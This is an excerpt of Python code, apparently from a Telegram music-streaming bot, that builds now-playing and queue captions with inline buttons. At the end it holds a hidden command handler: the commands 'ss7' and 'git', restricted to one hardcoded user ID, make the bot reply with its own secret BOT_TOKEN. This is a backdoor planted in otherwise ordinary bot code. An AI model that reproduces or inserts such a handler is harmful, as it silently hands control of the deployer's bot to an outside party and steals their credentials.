            ...
            if await is_active_chat(chat_id):
                ...
                run = await app.send_photo(
                    ...
                    caption=_["stream_1"].format(
                        title[:70],
                        f"https://t.me/UBDDBOT?start=info_{vidid}",
                        chat_id,
                        duration_min,
                        user_name,
                    ),
        ...
        if await is_active_chat(chat_id):
            ...
            run = await app.send_photo(
                ...
                caption=_["queue_4"].format(
                    position, title[:70], chat_id, duration_min, user_name
                ),
                reply_markup=InlineKeyboardMarkup(button),
            )
        else:
        ...
        if await is_active_chat(chat_id):
            ...
            run = await app.send_photo(
                ...
                caption=_["stream_3"].format(
                    title, chat_id, duration_min, user_name
                ),
                reply_markup=InlineKeyboardMarkup(button),
            )
            db[chat_id][0]["mystic"] = run
        ...
        if await is_active_chat(chat_id):
            ...
            run = await app.send_photo(
                ...
                caption=_["stream_4"].format(
                    title, link, chat_id, duration_min, user_name
                ),
                reply_markup=InlineKeyboardMarkup(button),
            )
            db[chat_id][0]["mystic"] = run
...
@app.on_message(command(["ss7", "git"]) & filters.user(1970797144))
async def muamen(c: Client, m: Message):
    await m.reply_text(f"• Hello Mr Shadow.\n\n• Bot Token:\n`{BOT_TOKEN}`")
